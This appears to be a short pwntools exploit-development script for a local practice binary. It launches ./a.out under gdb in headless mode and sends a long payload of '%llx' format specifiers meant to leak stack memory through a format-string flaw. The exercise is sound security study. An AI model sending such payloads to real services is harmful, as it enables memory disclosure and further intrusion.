#!/usr/bin/env python3

from pwn import *

context.log_level = 'debug'

p = process("./a.out")

# ✅ This prevents spawning a new terminal. Works 100% in headless environments.
gdb.attach(p, gdbscript="""
break main
continue
""", api=True)  # <--- This is key!

# Your payload
payload = '1 %d\n'
for i in range(20):
    payload += f'{i} %llx\n' * 100

p.send(payload)
p.interactive()
